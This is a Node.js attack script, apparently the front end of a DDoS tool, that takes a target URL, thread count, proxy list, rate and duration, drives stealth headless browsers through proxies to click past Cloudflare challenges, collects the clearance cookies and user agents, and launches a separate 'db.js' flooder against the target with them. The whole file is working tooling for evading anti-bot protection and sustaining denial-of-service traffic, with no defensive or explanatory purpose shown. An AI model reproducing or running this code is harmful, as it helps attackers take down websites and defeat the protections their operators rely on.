const errorHandler = error => {
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);
Array.prototype.remove = function (item) {
 const index = this.indexOf(item);
 if (index !== -1) {
   this.splice(index, 1);
 }
 return item;
}
const COOKIES_MAX_RETRIES = 1;
const async = require("async");
const fs = require("fs");
const request = require("request");
const puppeteer = require("puppeteer-extra");
const puppeteerStealth = require("puppeteer-extra-plugin-stealth");
process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 0;
const stealthPlugin = puppeteerStealth();
puppeteer.use(stealthPlugin);
const { spawn } = require("child_process");
if (process.argv.length < 7) {
  console.clear();
  console.log(`
\x1b[31m[$] \x1b[33mBROWSER \x1b[37mPRIVATES HENRY
\x1b[33m- \x1b[33m[ \x1b[37mHost \x1b[33m] [ \x1b[37mThread \x1b[33m] [ \x1b[37mProxy \x1b[33m] [ \x1b[37mRate \x1b[33m] [ \x1b[37mTime \x1b[33m]\x1b[0m
`);
  process.exit(1);
}
const targetURL = process.argv[2];
const threads = +process.argv[3];
const proxyFile = process.argv[4];
const fileContent = fs.readFileSync(proxyFile, 'utf8');
const proxiesCount = fileContent.split('\n').length;
const rates = process.argv[5];
const duration = process.argv[6];
const gay = process.argv[7];
let challengeCount = 0;
const sleep = duration => new Promise(resolve => setTimeout(resolve, duration * 1000));
const readLines = path => fs.readFileSync(path).toString().split(/\r?\n/);
const randList = list => list[Math.floor(Math.random() * list.length)];
const proxies = readLines(proxyFile);

function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomElement(element) {
    return element[Math.floor(Math.random() * element.length)];
}
 function maskString(proxy) {
  let [ip, port] = proxy.split(':');
  let segments = ip.split('.');
  segments[segments.length - 1] = '*'.repeat(segments[segments.length - 1].length);
  segments[segments.length - 2] = '*'.repeat(segments[segments.length - 2].length);
  port = '*'.repeat(port.length);
  let maskedIp = segments.join('.');
  let maskedProxy = `${maskedIp}:${port}`;
  
  return maskedProxy;
}
function check_proxy(proxy) {
  return new Promise((resolve, reject) => {
    request({
      url: "https://google.com",
      proxy: "http://" + proxy,
      headers: {
        'User-Agent': "curl/7.58.0",
      },
      timeout: 10000
    }, (err, res, body) => {
      if (!err && res.statusCode === 200) {
        resolve(proxy);
      } else {
        reject(err);
      }
    });
  });
}

async function isProxyValid(browserProxy) {
  try {
    await check_proxy(browserProxy);
    return browserProxy;
  } catch (error) {
    throw new Error();
  }
}

async function handleCFChallenge(page) {
  await sleep(15);
  const captchaContainer = await page.$('body > div.main-wrapper > div > div > div > div');
  if (captchaContainer) {
  const { x, y  } = await captchaContainer.boundingBox();
  await page.mouse.click(x +20, y +20  );
  }
  await sleep(15);
}
async function detectChallenge(browserProxy, page) {
  await page.waitForSelector('title');
  const title = await page.title();
  const content = await page.content();

  if (title === "Attention Required! | Cloudflare") {
    throw new Error("Proxy blocked");
  }
    if (content.includes("challenge-platform")) {
      await handleCFChallenge(page);
      return;
    }
  await sleep(10);
}
async function openBrowser(targetURL, browserProxy) {
 const userAgents = [
 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 14; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 14; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 14; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36', 
'Mozilla/5.0 (Linux; Android 14; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36',
'Mozilla/5.0 (Android 14; Mobile; rv:68.0) Gecko/68.0 Firefox/118.0',
'Mozilla/5.0 (Android 14; Mobile; LG-M255; rv:118.0) Gecko/118.0 Firefox/118.0', 
'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/118.0.5993.69 Mobile/15E148 Safari/604.1', 
'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/118.0 Mobile/15E148 Safari/605.1.15', 
'Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
'Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
'Mozilla/5.0 (Linux; Android 10; ONEPLUS A6003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.65 Mobile Safari/537.36 EdgA/117.0.2045.53',
'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 EdgiOS/117.2045.65 Mobile/15E148 Safari/605.1.15',
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36 Edg/126.0.0.0",
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36 Edg/125.0.0.0",
 ];
 const randomIndex = Math.floor(Math.random() * userAgents.length);
 const randomUA = userAgents[randomIndex];
 const promise = async (resolve, reject) => {
   const browser = await puppeteer.launch({
        headless: true,
        ignoreHTTPSErrors: true,
        detach: true,
        javaScriptEnabled: true,
        useAutomationExtension: true,
     args: [
      "--proxy-server=http://" + browserProxy,
      "--no-sandbox",
      "--no-first-run",
      "--no-default-browser-check",
      "--no-first-run",
      "--ignore-certificate-errors",
      "--disable-extensions",
      "--test-type",
      "--disable-gpu",
      "--disable-browser-side-navigation",
      "--disable-dev-shm-usage",
      "--disable-infobars",
      "--disable-blink-features=AutomationControlled",
      '--disable-features=IsolateOrigins,site-per-process', 
      '--renderer-process-limit=1',
      '--mute-audio',  
      '--enable-webgl', 
      '--ignore-certificate-errors',
      '--use-gl=disabled',
      '--color-scheme=dark',
      '--disable-infobars',
      '--disable-notifications',
      '--disable-popup-blocking',
      '--disable-setuid-sandbox',
      '--disable-accelerated-2d-canvas',
      "--disable-browser-side-navigation",
            "--user-agent="
            + randomUA
      ],
    ignoreDefaultArgs: ['--enable-automation']
});
   try {
     console.log(`\x1b[33m[+\x1b[37m] CHALLENGE SOLVED CAPTCHA\x1b[32m ` + maskString(browserProxy) + "");
     const [page] = await browser.pages();
     const client = page._client();
     
     
      await page.setExtraHTTPHeaders({
        'referer': targetURL 
    });
    await page.evaluateOnNewDocument(() => {
    navigator.permissions.query = (parameters) => {
        return Promise.resolve({ state: 'granted' });
    };
});

await page.setJavaScriptEnabled(true);
await page.setViewport({ width: 1920, height: 1080 });

    page.on("framenavigated", async (frame) => {
      if (frame.url().includes("challenges.cloudflare.com")) {
        await client.send("Target.detachFromTarget", { targetId: frame._id });
      }
    });
     page.setDefaultNavigationTimeout(60 * 1000);
   
     const userAgent = await page.evaluate(function () {
       return navigator.userAgent;
     });
     await page.goto(targetURL, { waitUntil: ["domcontentloaded"] });
     const title = await page.title();
     if (title === "Just a moment...") {
     await detectChallenge(browserProxy, page, reject);
    }
     const cookies = await page.cookies(targetURL);
     const referer = await page.evaluate(() => {
      return document.referrer;
    }); 
     resolve({
      title: title,
      browserProxy: browserProxy,
      cookies: cookies.map(cookie => cookie.name + "=" + cookie.value).join("; ").trim(),
      userAgent: randomUA,
      content: await page.content(),
      referer: referer,
    });

  } catch (exception) {
    
  } finally {
    await browser.close();
  }
}
 return new Promise(promise);
}
async function startThread(targetURL, browserProxy, task, done, retries = 0) {
  try {
    const response = await openBrowser(targetURL, browserProxy);
    const referer = response.referer;
    const hasChallenge = response.content.includes("challenge-platform");
    const hasCfChlCookie = response.cookies.includes("cf_chl");
    const isValidCookie = response.cookies.length > 32;

    if (!hasChallenge && (!hasCfChlCookie || (hasCfChlCookie && isValidCookie))) {
      const cookies =  
  "\x1b[34mSUCCESS SOLVED CAPTCHA BY HENRY\x1b[0m " +  
  "\x1b[34m| \x1b[0mTarget: \x1b[32m" + referer + " " +  
  "\x1b[34m| \x1b[0mTitle: \x1b[32m" + response.title + " " +  
  "\x1b[34m| \x1b[0mProxyFound: \x1b[32m" + maskString(response.browserProxy) + " " +  
  "\x1b[34m| \x1b[0mUser Agent: \x1b[32m" + response.userAgent + " " +  
  "\x1b[34m| \x1b[0mCookie: \x1b[32m" + response.cookies +  
  "\x1b[0m";  

console.log(cookies);     
                  spawn("node", [
                    "db.js",
                    targetURL,
                    duration,
                    "4",
                    response.browserProxy,
                    rates,
                    response.cookies,
                    response.userAgent
                  ]);
            }
      await startThread(targetURL, browserProxy, task, done, COOKIES_MAX_RETRIES);
    
  } catch (exception) {
    console.error(exception);
    await startThread(targetURL, browserProxy, task, done, COOKIES_MAX_RETRIES);
  }
}


var queue = async.queue(function (task, done) {
  startThread(targetURL, task.browserProxy, task, done);
}, threads);

async function main() {
  const queueDrainHandler = () => { };
  queue.drain(queueDrainHandler);
  for (let i = 0; i < proxiesCount; i++) {
    const browserProxy = randList(proxies);
    proxies.splice(proxies.indexOf(browserProxy), 1);
    isProxyValid(browserProxy)
    .then(browserProxy => {
      queue.unshift({ browserProxy: browserProxy });
     
    })
    .catch(error => {
    });
  }
  await sleep(duration);
  queue.kill();
  process.exit();
}

main();

